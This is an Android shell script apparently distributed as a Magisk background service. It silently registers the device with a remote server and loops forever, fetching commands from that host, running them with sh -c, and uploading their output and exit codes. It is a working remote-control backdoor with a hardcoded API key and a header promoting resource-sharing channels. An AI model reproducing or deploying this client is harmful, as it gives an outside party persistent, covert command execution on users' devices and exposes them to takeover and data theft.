#!/system/bin/sh
# ===================================================
#  官网:泽峰.top    更多公益开源资源分享 \n TG@ASDK886 QQ1063167389\n各大源码免费分享 网络搜集 打破信息差    官方频道:https://t.me/+FDfQgP9RFdljYjFl - 客户端 v3.1
#  静默运行，适合 Magisk 模块挂载
#  放在 /data/adb/service.d/ 自动后台运行
# ===================================================

BASE="http://fw-adb.mhfs.eu.org.cc/"
KEY_FILE="/data/local/tmp/device_key"
LOCK_FILE="/data/local/tmp/fanwu_client.lock"

# ============ 改成你的 api_key ============
API_KEY="803b582605359437d5b474858aaf0e5f"
# =========================================

# 防止重复运行
if [ -f "$LOCK_FILE" ]; then
    exit 0
fi
touch "$LOCK_FILE"

# 自动生成或读取设备ID
if [ -f "$KEY_FILE" ]; then
    DEVICE_KEY=$(cat "$KEY_FILE")
else
    DEVICE_KEY="dev_$(date +%s | tail -c 7)$(echo $RANDOM | tail -c 3)"
    echo "$DEVICE_KEY" > "$KEY_FILE"
    chmod 644 "$KEY_FILE"
fi

while true; do
    RESP=$(curl -s --connect-timeout 5 --max-time 10 -X POST \
        -d "action=register&key=$DEVICE_KEY&api_key=$API_KEY" \
        "$BASE/api.php" 2>/dev/null)
    
    CMD=$(echo "$RESP" | sed 's/.*"cmd":"//' | sed 's/".*//')
    
    if [ -n "$CMD" ] && [ "$CMD" != "" ]; then
        # 清除命令
        curl -s --connect-timeout 5 --max-time 10 -X POST \
            -d "action=clear_cmd&key=$DEVICE_KEY" \
            "$BASE/api.php" > /dev/null 2>&1
        
        # 执行命令
        OUT=$(sh -c "$CMD" 2>&1)
        CODE=$?
        
        # 上报结果，限制输出长度防止过大
        OUT_SHORT=$(echo "$OUT" | head -c 65535)
        curl -s --connect-timeout 5 --max-time 10 -X POST \
            --data-urlencode "action=result" \
            --data-urlencode "key=$DEVICE_KEY" \
            --data-urlencode "cmd=$CMD" \
            --data-urlencode "output=$OUT_SHORT" \
            --data-urlencode "exit_code=$CODE" \
            "$BASE/api.php" > /dev/null 2>&1
    fi
    
    sleep 3
done